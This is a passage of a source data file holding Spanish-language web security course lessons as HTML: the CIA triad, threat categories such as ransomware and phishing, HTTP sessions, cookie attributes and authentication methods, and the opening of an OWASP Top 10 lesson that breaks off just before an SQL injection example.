    PortSwigger, Web Security Academy, SQL Injection, [Online]. Available:
    <a href="https://portswigger.net/web-security" target="_blank">
      https://portswigger.net/web-security
    </a>
  </li>

  <li>
    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
  </li>
</ul>
        `
      },
      // Sección de introducción a seguridad web
    'intro-seguridad': {
      id: 'intro-seguridad',
      title: 'Conceptos clave de seguridad, contexto y retos en web',
      description: 'Principios fundamentales de la seguridad en aplicaciones web.',
      category: 'security-basics',
      htmlContent: `
        <p>
          La seguridad web constituye una disciplina técnica y estratégica orientada a proteger las aplicaciones, sitios y servicios basados en Internet, junto con los datos y usuarios que interactúan con ellos, contra amenazas, accesos no autorizados y explotaciones maliciosas. Su objetivo principal es garantizar que los activos digitales mantengan características fundamentales de seguridad.
        </p>
        <p>
          A diferencia de enfoques de seguridad pasivos o reactivos, la seguridad web moderna exige la integración de controles técnicos, políticas organizacionales, procesos de desarrollo seguro y capacitación continua. Las aplicaciones web representan la puerta de entrada principal a la mayoría de las organizaciones, exponiéndolas a ataques que pueden comprometer información personal, ejecutar transacciones fraudulentas o afectar a usuarios legítimos.
        </p>
        <p>
          En un contexto donde más del 72% de las empresas han integrado inteligencia artificial en al menos una función de negocio y donde las superficies de ataque se expanden continuamente debido a la adopción de servicios en la nube, APIs públicas y arquitecturas de microservicios, la seguridad web se ha convertido en un imperativo estratégico indispensable.
        </p>

        <h2>Conceptos clave de seguridad web</h2>
        <p>
          La tríada CIA es el modelo conceptual más utilizado en seguridad de la información y representa tres objetivos esenciales que toda estrategia de seguridad debe cumplir, estos son: confidencialidad (Confidentiality), integridad (Integrity) y disponibilidad (Availability). Estos principios fueron desarrollados para proporcionar un marco unificado que permita a las organizaciones evaluar, diseñar e implementar controles de seguridad efectivos.
        </p>

        <h3>Confidencialidad</h3>
        <p>
          La confidencialidad se refiere a la protección de la información contra el acceso no autorizado, asegurando que únicamente las personas, sistemas o procesos autorizados puedan acceder a datos sensibles. Este principio se aplica tanto a datos en reposo (almacenados en bases de datos, discos, archivos) como a datos en tránsito (transmitidos a través de redes).
        </p>
        <p>
          La pérdida de confidencialidad puede resultar en filtraciones masivas de datos personales, exposición de secretos comerciales, información gubernamental clasificada o credenciales de acceso. Según el informe de IBM sobre el costo de las brechas de datos de 2024, el costo promedio de una violación de datos alcanzó los 4.88 millones de dólares, un incremento significativo respecto a años anteriores.
        </p>
        <p>Las técnicas más comunes para garantizar confidencialidad incluyen:</p>
        <ul>
          <li>Cifrado de datos: Uso de algoritmos criptográficos para proteger información sensible tanto en almacenamiento como en transmisión (<code>TLS/SSL</code>, <code>AES</code>, <code>RSA</code>).</li>
          <li>Control de accesos basado en roles (RBAC): Limitación de privilegios según las responsabilidades del usuario.</li>
          <li>Autenticación multifactor (MFA): Verificación de identidad mediante múltiples factores (algo que se sabe, algo que se tiene, algo que se es).</li>
          <li>Gestión de identidades y accesos (IAM): Políticas centralizadas para administrar quién accede a qué recursos y en qué condiciones.</li>
        </ul>

        <h3>Integridad</h3>
        <p>
          La integridad consiste en garantizar que los datos sean precisos, completos y no hayan sido alterados de forma no autorizada durante su ciclo de vida. Este principio abarca tanto la integridad de los datos (los datos no han sido modificados accidental o deliberadamente) como la integridad de la fuente (los datos provienen de una fuente legítima y confiable).
        </p>
        <p>
          Si un atacante logra modificar datos en una base de datos, alterar el contenido de un sitio web, manipular transacciones financieras o inyectar código malicioso, la integridad del sistema se ve comprometida. Las consecuencias pueden incluir decisiones empresariales erróneas basadas en información falsa, pérdidas financieras directas y daño reputacional severo.
        </p>
        <p>Para proteger la integridad se emplean técnicas como:</p>
        <ul>
          <li>Funciones hash criptográficas: Algoritmos (<code>SHA-256</code>, <code>SHA-3</code>) que generan un identificador único para verificar que los datos no han sido alterados.</li>
          <li>Firmas digitales: Mecanismos que combinan hash criptográfico con cifrado asimétrico para autenticar la fuente y verificar la integridad.</li>
          <li>Certificados digitales y <code>SSL/TLS</code>: Protocolos que aseguran la autenticidad del servidor y la integridad de las comunicaciones.</li>
          <li>Controles de versiones y auditoría: Registros detallados de cambios que permiten rastrear modificaciones y revertir alteraciones no autorizadas.</li>
        </ul>

        <h3>Disponibilidad</h3>
        <p>
          La disponibilidad asegura que los sistemas, aplicaciones y datos estén accesibles para los usuarios autorizados en el momento en que los necesiten. Este principio es crítico para la continuidad operacional de las organizaciones, especialmente en sectores donde la interrupción de servicios puede tener consecuencias catastróficas (salud, finanzas, servicios públicos).
        </p>
        <p>
          Los ataques de denegación de servicio (DoS y DDoS), fallos de hardware, errores de configuración, desastres naturales o ataques de ransomware pueden comprometer la disponibilidad. Según reportes recientes, el ransomware representa el 81.1% de los incidentes de ciberseguridad dirigidos contra organizaciones en la Unión Europea.
        </p>
        <p>Las estrategias para garantizar disponibilidad incluyen:</p>
        <ul>
          <li>Redundancia y balanceo de carga: Distribución de tráfico entre múltiples servidores para evitar puntos únicos de fallo.</li>
          <li>Copias de seguridad (backups) y recuperación ante desastres: Planes y procedimientos para restaurar servicios críticos tras un incidente.</li>
          <li>Monitoreo continuo y respuesta a incidentes: Sistemas automatizados que detectan anomalías y activan protocolos de respuesta.</li>
          <li>Protección contra DDoS: Uso de servicios especializados que filtran tráfico malicioso antes de que afecte la infraestructura.</li>
        </ul>

        <h2>Contexto actual del panorama de amenazas</h2>
        <p>
          El entorno de seguridad web ha evolucionado drásticamente en los últimos años, caracterizado por un incremento tanto en la frecuencia como en la sofisticación de los ataques. Según análisis de Microsoft y otras organizaciones líderes en ciberseguridad, las empresas enfrentan más de 600 millones de ataques diarios, incluyendo ransomware, phishing, ataques de identidad y explotación de vulnerabilidades conocidas.
        </p>
        <p>
          Un desarrollo preocupante observado en 2025 es la incorporación de inteligencia artificial generativa por parte de actores maliciosos para mejorar la eficacia de sus ataques. Los atacantes utilizan modelos de lenguaje para:
        </p>
        <ul>
          <li>Crear correos electrónicos de phishing altamente convincentes y personalizados a escala masiva.</li>
          <li>Desarrollar sitios web falsos que imitan organizaciones legítimas con mayor precisión.</li>
          <li>Generar deepfakes para suplantar identidades en ataques de ingeniería social.</li>
          <li>Automatizar la escritura de código malicioso y exploits.</li>
        </ul>
        <p>
          El informe X-Force de IBM documentó un incremento del 84% en la entrega de infostealers (malware diseñado para robar credenciales) mediante correos de phishing entre 2023 y 2024, junto con un aumento del 12% año tras año en la venta de credenciales robadas en la dark web.
        </p>

        <h2>Vulnerabilidades en aplicaciones web</h2>
        <p>
          Las aplicaciones web continúan siendo objetivos prioritarios debido a su accesibilidad pública, la presencia de vulnerabilidades heredadas de bibliotecas de código abierto y la presión constante sobre los desarrolladores para lanzar código rápidamente. Según auditorías recientes:
        </p>
        <ul>
          <li>Cross-Site Scripting (XSS) está presente en aproximadamente el 18% de las aplicaciones web analizadas.</li>
          <li>SQL Injection afecta al 25% de las aplicaciones, aunque su prevalencia ha disminuido gradualmente gracias a mejores prácticas de desarrollo.</li>
          <li>Vulnerabilidades en APIs representan el 33% de las brechas en aplicaciones web, convirtiéndose en el vector más crítico debido a la adopción masiva de arquitecturas basadas en APIs.</li>
          <li>Autenticación rota está presente en el 27% de las aplicaciones, permitiendo a atacantes comprometer cuentas de usuario mediante credenciales débiles o mecanismos de autenticación mal implementados.</li>
        </ul>

        <h2>Motivaciones de los atacantes</h2>
        <p>
          Las motivaciones detrás de los ataques cibernéticos son diversas y han evolucionado conforme la tecnología y la geopolítica se transforman.
        </p>
        <p>
          Aproximadamente el 55% de los ataques están impulsados por ganancias económicas. Los atacantes buscan:
        </p>
        <ul>
          <li>Acceder a información financiera (tarjetas de crédito, cuentas bancarias).</li>
          <li>Extorsionar mediante ransomware, cifrando datos críticos y exigiendo rescates.</li>
          <li>Robar credenciales y venderlas en mercados clandestinos de la dark web.</li>
          <li>Realizar fraudes electrónicos y transferencias no autorizadas.</li>
        </ul>
        <p>
          El sector financiero, servicios empresariales y comercio electrónico son los blancos predilectos de este tipo de actividad criminal.
        </p>
        <p>
          Otro motivo tiene que ver con espionaje y objetivos geopolíticos. Los actores, respaldados por estados-nación, realizan operaciones de ciberespionaje para obtener secretos militares, industriales o políticos. Estos ataques han aumentado significativamente en contextos de conflictos geopolíticos, con grupos afiliados a gobiernos que emplean técnicas avanzadas, explotan vulnerabilidades de día cero y, en algunos casos, subcontratan operaciones a grupos criminales.
        </p>
        <p>
          Por otro lado, existen grupos hacktivistas que buscan promover causas políticas o ideológicas mediante ataques DDoS, defacement de sitios web o filtración de información confidencial. Aunque sus motivaciones difieren de las puramente criminales, el impacto sobre las organizaciones puede ser igualmente severo.
        </p>
        <p>
          También, lgunos ataques tienen como objetivo causar daño directo a la infraestructura, interrumpir operaciones críticas o dañar la reputación de organizaciones. Los ataques tipo "wiper" (destrucción masiva de datos) y las campañas de denegación de servicio prolongadas ejemplifican esta categoría.
        </p>

        <h2>Retos actuales en la seguridad web</h2>
        <p>
          La seguridad web enfrenta múltiples desafíos que se intensifican conforme aumenta la complejidad de las aplicaciones y la sofisticación de los atacantes. Algunos de ellos son:
        </p>
        <ol>
          <li>
            <strong>Expansión de las superficies de ataque:</strong> La adopción masiva de servicios en la nube, dispositivos IoT, arquitecturas de microservicios y APIs públicas ha ampliado drásticamente las superficies de ataque. Cada nuevo punto de entrada representa una potencial vulnerabilidad que debe ser monitoreada y protegida.
          </li>
          <li>
            <strong>Velocidad del desarrollo versus seguridad:</strong> La presión para lanzar productos rápidamente en entornos DevOps y CI/CD puede resultar en la implementación de código sin las revisiones de seguridad adecuadas. Los conflictos entre los objetivos de los desarrolladores (entregar funcionalidades rápidamente) y los equipos de seguridad (minimizar riesgos) representan un desafío organizacional significativo.
          </li>
          <li>
            <strong>Gestión deficiente de secretos y controles de acceso:</strong> Los entornos DevOps a menudo requieren acceso privilegiado controlado y gestión rigurosa de secretos (credenciales, claves SSH, tokens API). Sin embargo, en la búsqueda de velocidad, muchos equipos adoptan prácticas inseguras como almacenar credenciales en archivos dentro de contenedores, ejecutar procesos con acceso root innecesario o compartir credenciales administrativas.
          </li>
          <li>
            <strong>Factor humano:</strong> Más del 82% de las violaciones de seguridad involucraron algún elemento humano, incluyendo uso de credenciales robadas, phishing exitoso, errores de configuración y uso indebido de privilegios. La capacitación continua y la concientización son fundamentales, pero difíciles de mantener consistentemente en organizaciones grandes y dinámicas.
          </li>
        </ol>

        <h2>Referencias</h2>
        <ul>
          <li>D. Stuttard y M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN: Wiley Publishing, 2011.</li>

          <li>
            TechTarget, “What is the CIA triad (confidentiality, integrity and availability)?”, 
            [Online]. Available: 
            <a href="https://www.techtarget.com/whatis/definition/Confidentiality-integrity-and-availability-CIA" target="_blank">
              https://www.techtarget.com/whatis/definition/Confidentiality-integrity-and-availability-CIA
            </a>
          </li>

          <li>
            Snyk, “Secure Software Development Lifecycle (SSDLC),” [Online]. Available: 
            <a href="https://snyk.io/articles/secure-sdlc/" target="_blank">
              https://snyk.io/articles/secure-sdlc/
            </a>
          </li>

          <li>
            OWASP, “OWASP Top Ten,” 2021. [Online]. Available: 
            <a href="https://owasp.org/www-project-top-ten/" target="_blank">
              https://owasp.org/www-project-top-ten/
            </a>
          </li>

          <li>
            IBM, “IBM X-Force Threat Intelligence Index 2024,” [Online]. Available: 
            <a href="https://www.ibm.com/reports/threat-intelligence" target="_blank">
              https://www.ibm.com/reports/threat-intelligence
            </a>
          </li>

          <li>
            IBM Security, “Cost of a Data Breach Report 2023,” [Online]. Available:
            <a href="https://www.ibm.com/reports/data-breach" target="_blank">
              https://www.ibm.com/reports/data-breach
            </a>
          </li>

          <li>
            Wiz, “What is Secure SDLC (SSDLC)?,” [Online]. Available:
            <a href="https://www.wiz.io/academy/secure-sdlc" target="_blank">
              https://www.wiz.io/academy/secure-sdlc
            </a>
          </li>
        </ul>
      `
    },
    'amenazas-vulnerabilidades': {
      id: 'amenazas-vulnerabilidades',
      title: 'Amenazas y vulnerabilidades',
      description: 'Los riesgos más frecuentes y sus implicaciones en el entorno web moderno.',
      category: 'security-basics',
      htmlContent: `
        <p>
          El panorama actual de amenazas en ciberseguridad se caracteriza por la sofisticación, velocidad y escala sin precedentes de los ataques. Las organizaciones enfrentan adversarios que van desde grupos criminales motivados por ganancias económicas hasta actores respaldados por estados-nación que ejecutan campañas de espionaje y sabotaje. Más de 100 billones de señales son procesadas diariamente por proveedores de seguridad líderes, bloqueando alrededor de 4.5 millones de nuevos intentos de malware cada día y filtrando 5 mil millones de correos electrónicos en busca de phishing y contenido malicioso.
        </p>

        <p>
          En esta lección se pretende examina las principales categorías de amenazas que enfrentan las aplicaciones web y sistemas conectados a Internet.
        </p>

        <h2>Malware y sus variantes principales</h2>
        <p>
          El malware (software malicioso) es cualquier programa o código diseñado para causar daño, robar información, obtener acceso no autorizado o alterar el comportamiento normal de sistemas y aplicaciones. El malware sigue siendo una de las amenazas más dominantes y dinámicas, evolucionando constantemente para evadir sistemas de detección. Existen diferentes tipos de malware, entre los cuales se encuentran:
        </p>

        <h3>Ransomware</h3>
        <p>
          El ransomware es un tipo de malware que cifra archivos del dispositivo infectado utilizando claves criptográficas conocidas únicamente por el atacante. El operador del ransomware exige un rescate económico a cambio de la clave de descifrado necesaria para restaurar los datos. En los últimos años, el ransomware se ha consolidado como una de las amenazas más visibles y costosas.
        </p>
        <p>
          Los ataques de ransomware han aumentado más del 200% año tras año según reportes recientes, con más del 80% de los incidentes investigados orientados al robo de datos como parte de esquemas de extorsión. Los sectores más afectados incluyen salud, gobierno, educación y servicios financieros, donde la interrupción de servicios puede tener consecuencias críticas.
        </p>
        <p>
          Un cambio significativo en el comportamiento del ransomware es la adopción del modelo de doble extorsión: además de cifrar los datos, los atacantes extraen  información confidencial antes del cifrado y amenazan con publicarla si la víctima no paga.
        </p>

        <h3>Troyanos</h3>
        <p>
          Los troyanos son programas maliciosos que se presentan como software legítimo o útil. Una vez que la víctima descarga y ejecuta el troyano, este despliega su funcionalidad maliciosa. Los Remote Access Trojans (RATs) son una subcategoría diseñada específicamente para proporcionar acceso remoto no autorizado al atacante, permitiéndole controlar el sistema infectado, instalar software adicional, robar credenciales y moverse lateralmente en la red.
        </p>

        <h3>Spyware e Infostealers</h3>
        <p>
          El spyware está diseñado para recopilar información sensible sin el conocimiento del usuario, incluyendo credenciales de acceso, datos financieros, historial de navegación y comunicaciones. Los infostealers son una variante moderna y altamente efectiva, capaz de extraer tokens de sesión de navegadores, credenciales almacenadas y cookies de autenticación.
        </p>
        <p>
          Según el informe IBM X-Force 2024, se documentó un incremento del 84% en la entrega de infostealers mediante correos electrónicos de phishing entre 2023 y 2024, junto con un aumento del 12% en la venta de credenciales robadas en mercados clandestinos de la dark web.
        </p>

        <h3>Cryptojacking</h3>
        <p>
          El cryptojacking es el uso no autorizado de recursos computacionales de una víctima para minar criptomonedas. El malware de cryptojacking se ejecuta en segundo plano, consumiendo capacidad de procesamiento y energía sin conocimiento del usuario, generando ingresos para el atacante mientras degrada el rendimiento del sistema infectado.
        </p>

        <h2>Ingeniería social</h2>
        <p>
          La ingeniería social abarca técnicas psicológicas y de manipulación utilizadas por atacantes para engañar a las víctimas y lograr que revelen información sensible, ejecuten acciones peligrosas o concedan acceso a sistemas protegidos. A diferencia de los ataques puramente técnicos, la ingeniería social explota la confianza, el miedo, la urgencia o la autoridad percibida.
        </p>

        <h3>Phishing</h3>
        <p>
          El phishing es la técnica de ingeniería social más prevalente. Consiste en el envío de comunicaciones fraudulentas (generalmente correos electrónicos) que aparentan provenir de fuentes legítimas para engañar a las víctimas y lograr que revelen credenciales, hagan clic en enlaces maliciosos o descarguen archivos infectados.
        </p>
        <p>Los ataques de phishing han evolucionado significativamente:</p>
        <ul>
          <li>Los correos electrónicos con malware han aumentado un 131%.</li>
          <li>El 45% de las infecciones de ransomware ahora se originan a partir de correos de phishing.</li>
          <li>Los atacantes utilizan infraestructuras legítimas en la nube para alojar sitios de phishing, dificultando su detección mediante sistemas de seguridad tradicionales.</li>
        </ul>
        <p>
          Los archivos adjuntos tradicionalmente considerados inofensivos, como .TXT y .DOC, se han convertido en vectores principales de malware, aprovechando la confianza de los usuarios en estos formatos.
        </p>

        <h3>Business Email Compromise (BEC)</h3>
        <p>
          El BEC es un ataque sofisticado en el que el atacante suplanta la identidad de un ejecutivo o proveedor confiable para engañar a empleados y lograr transferencias fraudulentas de fondos o revelación de información confidencial. Según reportes de la industria, el BEC ha causado pérdidas superiores a los $43 mil millones de dólares a nivel global.
        </p>

        <h2>Ataques a la cadena de suministro</h2>
        <p>
          Los ataques a la cadena de suministro explotan la confianza que las organizaciones depositan en sus proveedores, socios y componentes de software de terceros. Los atacantes comprometen a un proveedor confiable para acceder a múltiples organizaciones objetivo simultáneamente.
        </p>
        <p>
          El acceso de terceros representa un vector crítico: las organizaciones permiten a proveedores y socios acceder a sus entornos de TI, y si un atacante compromete la red de un socio confiable, puede explotar ese acceso legítimo para infiltrarse en la organización objetivo.
        </p>

        <h2>Referencias</h2>
        <ul>
          <li>
            Fortinet. (2025). Informe global del panorama de amenazas de 2025. [Online]. Available: 
            <a href="https://www.fortinet.com/lat/resources/reports/threat-landscape-report" target="_blank">
              https://www.fortinet.com/lat/resources/reports/threat-landscape-report
            </a>
          </li>

          <li>
            Check Point. (2024). Las 10 principales vulnerabilidades de OWASP. [Online]. Available: 
            <a href="https://www.checkpoint.com/es/cyber-hub/cloud-security/what-is-application-security-appsec/owasp-top-10-vulnerabilities/" target="_blank">
              https://www.checkpoint.com/es/cyber-hub/cloud-security/what-is-application-security-appsec/owasp-top-10-vulnerabilities/
            </a>
          </li>

          <li>
            Microsoft. (2024). La extorsión y el ransomware impulsan más de la mitad de los ciberataques. [Online]. Available: 
            <a href="https://news.microsoft.com/source/latam/" target="_blank">
              https://news.microsoft.com/source/latam/
            </a>
          </li>

          <li>
            Check Point. (2025). Las 6 principales amenazas a la ciberseguridad. [Online]. Available: 
            <a href="https://www.checkpoint.com/es/cyber-hub/cyber-security/what-is-cybersecurity/top-6-cybersecurity-threats/" target="_blank">
              https://www.checkpoint.com/es/cyber-hub/cyber-security/what-is-cybersecurity/top-6-cybersecurity-threats/
            </a>
          </li>

          <li>
            OWASP. (2021). OWASP Top 10:2021. [Online]. Available: 
            <a href="https://owasp.org/Top10/es/" target="_blank">
              https://owasp.org/Top10/es/
            </a>
          </li>

          <li>
            Hornetsecurity. (2025). Tendencias en ciberseguridad que demuestran que los ciberdelincuentes están evolucionando. [Online]. Available: 
            <a href="https://www.hornetsecurity.com/es/blog/tendencias-ciberseguridad/" target="_blank">
              https://www.hornetsecurity.com/es/blog/tendencias-ciberseguridad/
            </a>
          </li>

          <li>
            IBM Security. (2024). IBM X-Force Threat Intelligence Index 2024. [Online]. Available: 
            <a href="https://www.ibm.com/reports/threat-intelligence" target="_blank">
              https://www.ibm.com/reports/threat-intelligence
            </a>
          </li>

          <li>
            PwC México. (2025). Tendencias y prioridades de ciberseguridad e IA en México 2024. [Online]. Available: 
            <a href="https://www.pwc.com/mx/es/ciberseguridad/digital-trust.html" target="_blank">
              https://www.pwc.com/mx/es/ciberseguridad/digital-trust.html
            </a>
          </li>

          <li>
            CrowdStrike. (2025). Informe Global sobre Amenazas 2025. [Online]. Available: 
            <a href="https://www.crowdstrike.com/es-es/global-threat-report/" target="_blank">
              https://www.crowdstrike.com/es-es/global-threat-report/
            </a>
          </li>

          <li>
            D. Stuttard y M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN: Wiley Publishing, 2011.
          </li>
        </ul>
    `
    },
    'fundamentos-tecnicos': {
      id: 'fundamentos-tecnicos',
      title: 'Fundamentos técnicos',
      description: 'Estructura del protocolo HTTP, mecanismos de autenticación y gestión de sesiones.',
      category: 'security-basics',
      htmlContent: `
        <h2>Estructura del protocolo HTTP</h2>

        <p>
          El protocolo HTTP es el mecanismo principal mediante el cual los navegadores y las aplicaciones intercambian información con los servidores web. Su diseño es simple y directo: el cliente envía una solicitud y el servidor responde con un resultado. Esta simplicidad es la razón de su eficiencia, pero también la causa de muchas vulnerabilidades que se originan en la manera en que las solicitudes son interpretadas, manipuladas o redirigidas a través de la red.
        </p>

        <p>
          HTTP es un protocolo sin estado, lo que significa que no conserva información de solicitudes previas. Cada vez que un cliente se comunica con el servidor, la interacción es tratada como un evento independiente. Esta característica obliga a las aplicaciones web a implementar mecanismos adicionales para mantener continuidad, como sesiones, cookies y otros elementos que se explicarán más adelante.
        </p>

        <p>
          Una solicitud HTTP está compuesta por un método, un recurso solicitado, una versión del protocolo y un conjunto de encabezados. Los métodos más utilizados son <code>GET</code> y <code>POST</code>. <code>GET</code> se emplea para recuperar información, mientras que <code>POST</code> se usa para enviar datos al servidor. Aunque ambos pueden transmitir información, la práctica recomendada es reservar <code>GET</code> para solicitudes que no modifican el estado del servidor y utilizar <code>POST</code> para operaciones más sensibles o que involucran datos personales. La respuesta del servidor consta de un código de estado, encabezados y un cuerpo que contiene el contenido solicitado. Un ejemplo típico es el código <code>200</code>, que indica éxito, mientras que <code>404</code> señala que el recurso no existe.
        </p>

        <p>
          El uso de HTTPS, una extensión de HTTP que utiliza cifrado mediante <code>TLS</code>, es fundamental para proteger la integridad y la confidencialidad de la comunicación. Sin esta capa de seguridad, cualquier elemento transmitido puede ser interceptado y leído por un atacante con acceso al tráfico de red. Esto incluye credenciales, datos personales y cookies de sesión. Toda aplicación moderna debe operar exclusivamente sobre HTTPS para evitar la exposición de información sensible.
        </p>

        <h2>Gestión de sesiones en aplicaciones web</h2>

        <p>
          Debido a que HTTP no mantiene estado, las aplicaciones utilizan el concepto de sesión para identificar a un usuario a lo largo de múltiples solicitudes. Una sesión es un espacio temporal donde se almacena información relevante, como si el usuario está autenticado, qué permisos tiene o qué acciones ha realizado recientemente. Sin sesiones, el servidor no podría distinguir entre un usuario legítimo y un visitante que acaba de abrir la aplicación por primera vez.
        </p>

        <p>
          El elemento central de la sesión es el identificador de sesión, también conocido como Session ID. Este identificador funciona como un comprobante que permite al servidor reconocer al usuario en siguientes interacciones. Normalmente se genera después de un inicio de sesión exitoso y se almacena en una cookie que el navegador envía de forma automática en cada solicitud posterior. El Session ID debe ser aleatorio, difícil de adivinar y suficientemente largo para evitar ataques basados en predicción o fuerza bruta.
        </p>

        <p>
          Si un atacante obtiene este identificador, ya sea mediante un ataque de secuestro de sesión, mediante XSS, a través de una red comprometida o por exposición involuntaria en una URL, puede utilizarlo para hacerse pasar por el usuario original sin necesidad de conocer la contraseña. Por esta razón, la administración correcta de sesiones es uno de los aspectos más importantes de la seguridad en aplicaciones web. Esto incluye renovar el identificador después del inicio de sesión, invalidarlo al cerrar la sesión, establecer tiempos de expiración claros y asegurarse de que nunca se transmita mediante canales no cifrados.
        </p>

        <h2>Cookies y atributos de seguridad</h2>

        <p>
          Las cookies son pequeños archivos que el servidor envía al navegador para almacenar información de manera persistente o semipersistente. Aunque pueden utilizarse para una variedad de fines, su uso más crítico está relacionado con el almacenamiento de identificadores de sesión o tokens de autenticación. Debido a la sensibilidad de esta información, la configuración de una cookie debe hacerse con extremo cuidado.
        </p>

        <p>
          Para proteger una cookie, se emplean atributos de seguridad. El atributo <code>HttpOnly</code> evita que el contenido de la cookie sea accesible mediante JavaScript, lo cual reduce el impacto de un ataque de tipo XSS. El atributo <code>Secure</code> permite que la cookie sea enviada únicamente mediante conexiones HTTPS, lo cual evita que se transmita en texto claro. El atributo <code>SameSite</code> restringe si la cookie puede enviarse en solicitudes generadas desde otro dominio. Esta última medida es particularmente importante para prevenir ataques de tipo <code>CSRF</code>, donde un sitio externo induce al navegador de la víctima a enviar solicitudes maliciosas hacia una aplicación autenticada.
        </p>

        <p>
          Las cookies pueden ser de sesión o persistentes. Las primeras desaparecen al cerrar el navegador, mientras que las persistentes incluyen una fecha de expiración y permanecen hasta cumplir ese tiempo. En ambos casos, si la cookie almacena información relacionada con autenticación, debe protegerse mediante los atributos mencionados. Un fallo en esta configuración puede permitir que las cookies sean interceptadas, modificadas o reutilizadas por un atacante.
        </p>

        <h2>Métodos de autenticación utilizados en aplicaciones web</h2>

        <p>
          La autenticación tiene como finalidad demostrar que un usuario es quien dice ser. En aplicaciones web se emplean diversos métodos para llevar a cabo este proceso, y cada uno tiene implicaciones y riesgos específicos.
        </p>

        <p>
          El método más tradicional consiste en la autenticación basada en sesiones. Después de que el usuario proporciona sus credenciales, el servidor las valida y genera un identificador de sesión. Esta identificación se almacena en una cookie y se envía con cada solicitud para demostrar que el usuario ya se ha autenticado anteriormente. Esta técnica es simple y muy utilizada en aplicaciones estructuradas bajo arquitecturas clásicas. Sin embargo, si la cookie es robada, el atacante obtiene acceso inmediato.
        </p>

        <p>
          Las aplicaciones modernas utilizan frecuentemente autenticación mediante tokens, en especial tokens <code>JWT</code>. Estos tokens incluyen información firmada digitalmente que puede ser validada por el servidor sin necesidad de mantener información de estado. Aunque esto facilita la escalabilidad, también introduce riesgos importantes. Un token <code>JWT</code> robado permanece válido hasta que expire. Si la aplicación almacena estos tokens en localStorage u otros espacios accesibles desde JavaScript, el riesgo de exposición ante un ataque XSS aumenta considerablemente.
        </p>

        <p>
          Finalmente, existen métodos como OAuth 2.0, que permiten a la aplicación delegar el proceso de autenticación a un proveedor externo. Este mecanismo reduce la necesidad de gestionar contraseñas, pero requiere controles estrictos sobre los dominios de redirección y la validez de los tokens emitidos. Una mala implementación puede permitir el secuestro del flujo de autenticación y el robo de tokens de acceso.
        </p>

        <h2>Bibliografía</h2>

        <ul>
          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN, USA: Wiley Publishing, 2011.</li>

          <li>OWASP Foundation, Session Management Cheat Sheet. [Online]. Available:
            <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank">
              https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html
            </a>
          </li>

          <li>OWASP Foundation, Authentication Cheat Sheet. [Online]. Available:
            <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank">
              https://owasp.org/www-project-cheat-sheets/cheatsheets/Authentication_Cheat_Sheet.html
            </a>
          </li>

          <li>M. Zalewski, <i>The Tangled Web: A Guide to Securing Modern Web Applications</i>. San Francisco, CA, USA: No Starch Press, 2012.</li>

          <li>Mozilla Developer Network, HTTP Overview. [Online]. Available:
            <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview" target="_blank">
              https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview
            </a>
          </li>
        </ul>
    `
    },
    'owasp-top-10': {
      id: 'owasp-top-10',
      title: 'OWASP Top 10',
      description: 'Las vulnerabilidades más críticas según OWASP.',
      category: 'security-basics',
      htmlContent:`
              <p>
          OWASP Top 10 es una referencia ampliamente utilizada en la industria para comprender las vulnerabilidades más críticas en aplicaciones web. Su propósito es generar conciencia sobre los riesgos más frecuentes, explicar cómo ocurren estas fallas y promover prácticas que reduzcan de manera significativa la superficie de ataque. Aunque no es un estándar obligatorio, muchas organizaciones lo adoptan como guía fundamental para auditorías, desarrollo seguro y análisis de riesgos.
        </p>

        <p>
          El listado se actualiza periódicamente para reflejar cómo evolucionan las amenazas y las técnicas de ataque. En cada edición se revisan millones de incidentes, reportes comunitarios y estudios especializados para identificar qué vulnerabilidades representan el mayor riesgo práctico en el panorama real de la seguridad web. Esto convierte a OWASP Top 10 en un mapa actualizado del comportamiento de los atacantes y de los errores más comunes que persisten en aplicaciones modernas. El top 10 se describe a continuación:
        </p>

        <h2>1. Control inadecuado del acceso</h2>

        <p>
          El control de acceso insuficiente es una de las vulnerabilidades más frecuentes y de mayor impacto. Este problema ocurre cuando la aplicación permite a un usuario realizar acciones o acceder a recursos para los cuales no tiene permisos legítimos. El error suele originarse en la falta de validación del lado del servidor, donde se confía en parámetros enviados desde el cliente para determinar qué contenido debe mostrarse o qué operaciones están autorizadas.
        </p>

        <p>
          Un ejemplo típico aparece cuando la aplicación recibe un identificador enviado por el usuario y lo utiliza para recuperar información sin comprobar si pertenece al usuario autenticado. Si un atacante manipula la solicitud y reemplaza ese identificador con el de otra persona, puede acceder a información ajena o ejecutar acciones en nombre de terceros. Este tipo de falla permite escalación horizontal o vertical de privilegios y afecta directamente la integridad de la lógica interna del sistema.
        </p>

        <h2>2. Fallas criptográficas</h2>

        <p>
          Las fallas criptográficas abarcan errores relacionados con el manejo inadecuado de la información sensible, especialmente cuando se trata de contraseñas, números de tarjetas o datos personales. Estas fallas suelen ocurrir cuando la aplicación almacena información sin cifrar, utiliza algoritmos desactualizados, transmite datos sin protección o aplica un cifrado incorrecto para la confidencialidad requerida.
        </p>

        <p>
          Un ejemplo común es almacenar contraseñas en texto plano o utilizando algoritmos débiles como MD5. En caso de una brecha, un atacante puede recuperar las contraseñas sin mayor esfuerzo. De manera similar, transmitir información por HTTP en lugar de HTTPS expone todos los datos al riesgo de interceptación. La correcta implementación de cifrado requiere algoritmos modernos, manejo adecuado de claves, sal aleatoria y mecanismos que aseguren integridad y confidencialidad.
        </p>

        <h2>3. Inyección</h2>

        <p>
          Las vulnerabilidades de inyección se presentan cuando un atacante inserta datos no confiables que alteran la estructura o comportamiento de una instrucción interpretada por el servidor. Entre los tipos más conocidos se encuentran la inyección SQL, la inyección de comandos y la inyección LDAP. El origen del problema es la falta de validación adecuada en entradas que son combinadas directamente con instrucciones internas.
        </p>

        <p>
          Un ejemplo clásico de inyección SQL aparece cuando el código genera consultas concatenando valores proporcionados por el usuario:
        </p>

